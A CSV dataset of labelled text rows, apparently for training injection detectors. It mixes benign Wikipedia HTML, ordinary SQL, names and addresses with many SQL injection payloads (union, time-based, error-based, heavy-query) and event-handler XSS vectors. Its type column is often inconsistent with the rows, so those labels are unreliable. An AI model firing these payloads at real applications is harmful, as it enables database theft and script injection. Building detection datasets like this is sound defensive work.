Text,Label,type
"	 <div class=""plainlinks hlist navbar mini""><ul><li class=""nv-view""><a href=""/wiki/Template:Evolutionary_computation"" title=""Template:Evolutionary computation""><abbr title=""View this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">v </abbr> </a> </li><li class=""nv-talk""><a href=""/wiki/Template_talk:Evolutionary_computation"" title=""Template talk:Evolutionary computation""><abbr title=""Discuss this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">t </abbr> </a> </li><li class=""nv-edit""><a class=""external text"" href=""https://en.wikipedia.org/w/index.php?title=Template:Evolutionary_computation&amp;action=edit""><abbr title=""Edit this template"" style="";;background:none transparent;border:none;-moz-box-shadow:none;-webkit-box-shadow:none;box-shadow:none; padding:0;"">e </abbr> </a> </li> </ul> </div>",0,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;449–455 </li> </ul>",0,xss
<table onpointerout=alert(1)>XSS</table>,2,xss
-5389'||  (  select 'gggl' where 1020  =  1020 union all select 1020#,1,sql
SELECT * FROM limited WHERE oil BETWEEN '1996-07-01' AND '1996-07-31',0,sql
carretera 200 hasta km. 1 barra de mio 175,0,xss
equiparable,0,sql
<link onpointerup=alert(1)>XSS</link>,2,xss
oktar,0,sql
"  SELECT fox AS north, ahead AS [each]  FROM office",0,sql
"<li><i><a href=""/wiki/World_Brain"" title=""World Brain"">World Brain </a> </i><span class=""nowrap"">&#160; ",0,xss
"  SELECT buy,them FROM changing WHERE difference = 'major' UNION SELECT dead, tightly FROM hang",0,sql
" select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",1,xss
"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",1,sql
1'+  (  select 'cwta' where 6091  =  6091,1,sql
"<br onkeypress=""alert(1)"" contenteditable>test</br>",2,xss
"-8054'   )    )    union all select 5232,5232,5232,5232,5232,5232,5232#",1,sql
shakor,0,sql
	 </span>,0,xss
"	 </span> <span class=""reference-text"">",0,xss
	 </span>,0,xss
SELECT * FROM pile 3,0,sql
c63en13759,0,sql
"<meta name=""referrer"" content=""origin-when-crossorigin""/>",0,xss
SELECT * FROM night WHERE soldier = 'past' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM careful FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
88903644l,0,sql
SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  ORDER BY wp_posts.post_title ASC,0,sql
SELECT * FROM  ( SELECT porch FROM complete ) ,0,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 19 </li> </ul>",0,xss
SELECT fairly ( s )  FROM creature FULL OUTER JOIN,0,xss
8.7027E+15,0,xss
"<marquee onkeyup=""alert(1)"" contenteditable>test</marquee>",2,xss
"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
SELECT * FROM fifteen WHERE stopped = 'rising' LIMIT 3,0,xss
<style onpointerenter=alert(1)>XSS</style>,2,xss
SELECT knew FROM basket UNION ALL SELECT impossible FROM heading ORDER BY announced,0,sql
pl. emilio simon 28,0,sql
2.02612E+15,0,sql
SELECT * FROM than WHERE peace = 'care' LIMIT 3,0,sql
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',1,sql
"-7889""   )    )    as oayf where 1765  =  1765 or 8571  =  8571--",1,sql
linero-noro@cocheacoche.uy,0,sql
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",2,xss
72094500b,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"<ul><li><a href=""/wiki/Programming_paradigm"" title=""Programming paradigm"">Programming paradigm </a> </li>",0,xss
"<noframes draggable=""true"" ondragleave=""alert(1)"">test</noframes>",2,xss
SELECT * FROM grandmother  WHERE fourth NOT LIKE '[previous]%',0,sql
SELECT COUNT ( DISTINCT pupil )  FROM movement,0,sql
25214,0,sql
"<li><a href=""/wiki/Service_robot"" title=""Service robot"">Service </a> </li>",0,xss
bakey_noah@inmobiliariahangar.ki,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web"">Bostrom, Nick (2015). <a rel=""nofollow"" class=""external text"" href=""https://www.ted.com/talks/nick_bostrom_what_happens_when_our_computers_get_smarter_than_we_are/transcript"">""What happens when our computers get smarter than we are?"" </a>. <a href=""/wiki/TED_(conference)"" title=""TED (conference)"">TED (conference) </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=What+happens+when+our+computers+get+smarter+than+we+are%3F&amp;rft.pub=TED+%28conference%29&amp;rft.date=2015&amp;rft.aulast=Bostrom&amp;rft.aufirst=Nick&amp;rft_id=https%3A%2F%2Fwww.ted.com%2Ftalks%2Fnick_bostrom_what_happens_when_our_computers_get_smarter_than_we_are%2Ftranscript&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<header ondblclick=""alert(1)"">test</header>",2,xss
SELECT DISTINCT early FROM spoken,0,sql
SELECT ago ( s FROM master RIGHT JOIN,0,sql
"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  8450  =  8450",1,sql
SELECT * FROM neck WHERE when = 'how' FETCH FIRST 3 ROWS ONLY,0,sql
passatge de manyer 105,0,sql
"calle salvador de madariaga s/n,",0,sql
SELECT * FROM practice WHERE waste = 'board'  AND City = 'control',0,sql
SELECT TOP 50 PERCENT * FROM one,0,sql
"<a href=""/wiki/Heuristic"" title=""Heuristic"">Heuristic </a> or informed searches (e.g., greedy <a href=""/wiki/Best-first_search"" title=""Best-first search"">best first </a> and <a href=""/wiki/A*_search_algorithm"" title=""A* search algorithm"">A* </a>):",0,xss
07077546d,0,sql
sonoe,0,sql
"  SELECT * FROM fallen WHERE whistle IN  ( 'strip', 'herself', 'direction' )  ",0,sql
 UPDATE thread SET tool = 'surprise'WHERE fighting = 'clothes',0,xss
pa24dan3cea,0,sql
-8911%' or 9323  =  9323#,1,sql
02879028a,0,sql
"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",1,sql
SELECT TOP 3 * FROM mark SELECT * FROM raw 3SELECT * FROM bill,0,sql
SELECT sea ( s FROM consider RIGHT JOIN,0,xss
kaycee,0,sql
sylvia,0,xss
"<dfn draggable=""true"" ondragleave=""alert(1)"">test</dfn>",2,xss
"1%'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  '%'  =  '",1,sql
SELECT * FROM stepped FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM speak,0,xss
"<wbr onmouseenter=""alert(1)"">test</wbr>",2,xss
"<style>:target {color: red;}</style><thead id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></thead>",2,xss
"-5073""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""kbab"" like ""kbab",1,sql
document.URL,2,xss
"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio>",2,xss
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationstart=""alert(1)""></dl>",2,xss
7.33372E+15,0,sql
SELECT COUNT ( DISTINCT theory )  FROM stairs,0,sql
SELECT return ( s )  FROM wait SELECT sound ( s ) ,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"1'  )   union all select null,null,null,null,null--",1,sql
"<bdi onmouseout=""alert(1)"">test</bdi>",2,xss
benasque,0,sql
"elt  (  5953  =  5953,1  )  ",1,xss
"calle reina violante, 35,",0,sql
SELECT TOP 50 PERCENT * FROM disease,0,sql
SELECT * FROM nearby  WHERE went = she,0,sql
"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sql
SELECT early ( s )  FROM population UNION ALL,0,sql
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",1,sql
SELECT hospital FROM why,0,sql
1'||  (  select 'hafu' where 6226  =  6226,1,xss
45634,0,xss
"        <a href=""intro/overview.html"" class=""btn btn-neutral float-right"" title=""Scrapy at a glance"" accesskey=""n"" rel=""next"">Next <span class=""fa fa-arrow-circle-right"">",0,xss
SELECT * FROM letter WHERE too BETWEEN 'slabs' AND 'ten',0,xss
SELECT prepare ( s FROM shade RIGHT JOIN,0,sql
 </li>,0,xss
<textarea oninput=alert(1)>XSS</textarea>,2,xss
1zu67rado,0,sql
"-7482""   )    )     )   or 9077  =  2651",1,sql
"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",1,sql
"	 </span> <span class=""reference-text""><a href=""/wiki/Seppo_Linnainmaa"" title=""Seppo Linnainmaa"">Seppo Linnainmaa </a> (1970). The representation of the cumulative rounding error of an algorithm as a Taylor expansion of the local rounding errors. Master's Thesis (in Finnish), Univ. Helsinki, 6–7. ",0,xss
"calle pea de francia, 58,",0,sql
"<output onkeydown=""alert(1)"" contenteditable>test</output>",2,xss
SELECT * FROM  ( SELECT breeze FROM exact ) ,0,xss
mald,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_file_sync_1_process_lock' LIMIT 1,0,sql
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,1,sql
SELECT war ( s )  FROM daughter FULL OUTER JOIN,0,sql
"1""   )    )   ",1,xss
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",2,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """,1,xss
"calle diseminado hornos de rey 29, 7?b",0,sql
"<dd ondblclick=""alert(1)"">test</dd>",2,xss
SELECT * FROM certain WHERE trouble = 'thou',0,sql
6ilia+ria,0,xss
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox",1,sql
"  SELECT more,wide FROM trade WHERE kids = 'begun' UNION SELECT along, grown FROM roll",0,sql
"<li><a href=""/wiki/Commensurability_(philosophy_of_science)"" title=""Commensurability (philosophy of science)"">Commensurability </a> </li>",0,xss
"1%""   )    )    union all select null,null,null,null,null,null,null--",1,sql
"1""  )   as mibc where 3113  =  3113",1,sql
olivio,0,sql
"1""  )   where 9656  =  9656 and sleep  (  5  )  --",1,sql
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature,0,sql
fortet esquer,0,sql
"<A HREF=""http://google:ha.ckers.org""></A>",2,xss
ge2613an0,0,xss
ben,0,sql
"   SELECT strong, planned, massFROM trip WHERE paper  IS NOT NULL",0,sql
2.75401E+15,0,sql
"<h3><span class=""mw-headline"" id=""Art"">Art ",0,xss
"<style>:target {color:red;}</style><blockquote id=x style=""transition:color 1s"" ontransitionend=alert(1)></blockquote>",2,xss
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1,sql
<article onpointerleave=alert(1)>XSS</article>,2,xss
pechur@spainbareback.fm,0,sql
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",1,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Mathematics<br />of computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
avinguda de la reina maria cristina 174 2?b,0,sql
"-9779'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'hmzj'  =  'hmzj",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"-9535"" order by 1--",1,sql
select   (  case when   (  1961  =  2048  )   then 1961 else 1961*  (  select 1961 from information_schema.character_sets  )   end  )  #,1,sql
	 </span> ,0,xss
desailly_bosworth@coworkers.gov,0,sql
47343175k,0,sql
SELECT arrangement ( s )  FROM ocean FULL OUTER JOIN,0,sql
<base onpointerup=alert(1)>XSS</base>,2,xss
	 </span></a></dt><dd>Customize how pages get requested and downloaded.</dd>,0,xss
"<IMG """"""><SCRIPT>alert("""")</SCRIPT>""\>",2,xss
"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
1'  )   as imgv where 7802  =  7802,1,sql
rigente,0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",1,sql
"<blink onmouseenter=""alert(1)"">test</blink>",2,xss
villalgordo del marquesado,0,sql
"<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b> ",0,xss
SELECT TOP 3 * FROM spite WHERE speech = 'attack' SELECT * FROM society,0,xss
SELECT * FROM oil WHERE somehow NOT LIKE 'disappear%',0,sql
6e665a,0,xss
"INSERT INTO aboard  ( smallest, large, somehow )  VALUES  ( 'ready', 'maybe', 'element' )  ",0,sql
bada gorina,0,sql
SELECT AVG ( key )  FROM trip  SELECT SUM ( orange ) ,0,sql
"INSERT INTO refused  ( angry, from, rhyme )  VALUES  ( 'fly', 'chicken', 'team' )  ",0,sql
ajmet,0,xss
SELECT * FROM task FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM house,0,sql
kelcy,0,sql
"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",1,xss
"el provencio, 6 8f",0,xss
"<area onmouseover=""alert(1)"">test</area>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",2,xss
pascuet landivar,0,xss
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,sql
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ) ,0,sql
SELECT quietly FROM stage UNION ALL SELECT afraid FROM again ORDER BY plate,0,sql
cresta-da,0,sql
SELECT AVG ( failed ) FROM atomic SELECT SUM ( nation ) ,0,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
SELECT * FROM also WHERE NOT research = 'system'  AND NOT basic = 'post',0,xss
"1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '",1,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",1,sql
"<a href=""/wiki/Artificial_life"" title=""Artificial life"">Artificial life </a> and society based learning:",0,xss
select   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  select 6047 from information_schema.character_sets  )   end  )  #,1,sql
"1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,2,xss
"   SELECT south, president+ ', ' + heat+ ' ' + fact+ ', ' + finger AS which  FROM leader",0,sql
"<sup oncopy=""alert(1)"" contenteditable>test</sup>",2,xss
"1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'yqzg'  =  'yqzg",1,sql
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya",1,sql
9.32767E+15,0,sql
-2960' or 2163  =  3143--,1,sql
"<li><a href=""/wiki/Functionalism_(philosophy_of_mind)"" title=""Functionalism (philosophy of mind)"">Functionalism </a> </li>",0,xss
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg",1,sql
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",2,xss
SELECT AVG ( walk )  FROM magnet  SELECT SUM ( silent ) ,0,sql
"<li><a href=""/wiki/Analysis_of_algorithms"" title=""Analysis of algorithms"">Analysis of algorithms </a> </li>",0,xss
"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",1,sql
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",2,xss
<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>,2,xss
<style onreadystatechange=alert(1)></style>,2,xss
"<h2>Built-in services<a class=""headerlink"" href=""#built-in-services"" title=""Permalink to this headline"">¶</a></h2>",0,xss
<summary onpointerleave=alert(1)>XSS</summary>,2,xss
"		<li id=""pt-anonuserpage"">Not logged in </li>",0,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,sql
scotty,0,sql
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",2,xss
SELECT * FROM river FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""umst""  =  ""umst",1,sql
"<div class=""section"" id=""built-in-services"">",0,xss
select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"<command onmouseleave=""alert(1)"">test</command>",2,xss
select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,1,xss
"1""  )   and sleep  (  5  )   and   (  ""ytof""  =  ""ytof",1,sql
SELECT * FROM tin WHERE before BETWEEN general09/01/1996poor AND practice15/31/1996that,0,sql
"<nextid onmouseout=""alert(1)"">test</nextid>",2,xss
SELECT * FROM settle WHERE or BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1' where 2774  =  2774 union all select null,null,null,null,null#",1,sql
SELECT * FROM universe WHERE clothes = 'catch' LIMIT 3,0,sql
"<li id=""cite_note-Neats_vs._scruffies-17""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Neats_vs._scruffies_17-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Neats_vs._scruffies_17-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-Neats_vs._scruffies_17-2""><sup><i><b>c </b> </i> </sup> </a> ",0,xss
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",1,sql
"<track oncopy=""alert(1)"" contenteditable>test</track>",2,xss
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",2,xss
"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,1,sql
SELECT * FROM coach WHERE fall = 'seems'  AND  ( including = 'factor' OR struck = 'mostly' ) ,0,xss
SELECT * FROM require WHERE headed = 'gravity'  OR writing = 'game',0,xss
"1%""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1,xss
 </li>,0,xss
1.20613E+15,0,sql
 </li>,0,xss
femke,0,sql
1 where 3502  =  3502 order by 1--,1,sql
"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  """,1,sql
select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,1,sql
<svg><section onload=alert(1)></section>,2,xss
"<style>:target {transform: rotate(180deg);}</style><caption id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></caption>",2,xss
15873,0,xss
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sql
51795949h,0,sql
SELECT * FROM law ORDER BY line DESC,0,sql
"c/ fuente del peral 41,",0,sql
"SELECT POSITION ( ""COM"" IN ""W3Schools.com"" )  AS MatchPosition;",0,sql
SELECT * FROM population ORDER BY page DESC,0,sql
"INSERT INTO brass  ( continued, stock, to )  VALUES  ( 'compass', 'exciting', 'partly' )  ",0,xss
"1%""   )    )     )   and 9198  =  9198--",1,xss
"1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",1,xss
1'+  (  select ggah where 3263  =  3263 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +',1,sql
union select,1,sql
1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',1,xss
"<h4><span class=""mw-headline"" id=""Machine_ethics"">Machine ethics ",0,xss
<rb onpointerenter=alert(1)>XSS</rb>,2,xss
ductilidad,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Computer_security"" title=""Computer security"">Security </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
 or 1 --',1,sql
48714518n,0,xss
"<li><a href=""/wiki/AI_takeover"" title=""AI takeover"">AI takeover </a> </li>",0,xss
<content onpointerdown=alert(1)>XSS</content>,2,xss
spruance@maquillajeparalabios.ro,0,sql
"1""  )   as wvxt where 7321  =  7321 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,xss
"  SELECT deal,college FROM everybody WHERE active = 'mirror' UNION SELECT cloth, scared FROM indicate",0,xss
"-1859' union all select 1781,1781,1781,1781#",1,xss
SELECT COUNT ( kill )  FROM atomic,0,sql
-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,1,xss
lo7ange,0,xss
SELECT * FROM saved WHERE satellites = 'evening' FETCH FIRST 3 ROWS ONLY,0,xss
SELECT * FROM sudden WHERE ourselves = 'stairs' FETCH FIRST 3 ROWS ONLY,0,sql
kostka5@institutoandaluzdelmar.an,0,sql
22440,0,xss
alexiana,0,sql
1'||  (  select 'bsbv' from dual where 5276  =  5276 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1,sql
"  SELECT * FROM sale WHERE saddle IN  ( 'tea', 'sent', 'missing' )  ",0,sql
<p onpointerout=alert(1)>XSS</p>,2,xss
homero,0,sql
<set onpointerenter=alert(1)>XSS</set>,2,xss
SELECT * FROM door WHERE slowly = 'bright'  OR best = 'season',0,sql
19432,0,sql
"<li><a href=""/wiki/Memetic_algorithm"" title=""Memetic algorithm"">Memetic algorithm </a> </li> </ul>",0,xss
</ul>,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
gervasio,0,sql
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1,xss
"  UPDATE they SET or =  'golden', City =  'path' WHERE us =  onto",0,sql
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1,xss
alfonso.julissa@naturalchild.tk,0,sql
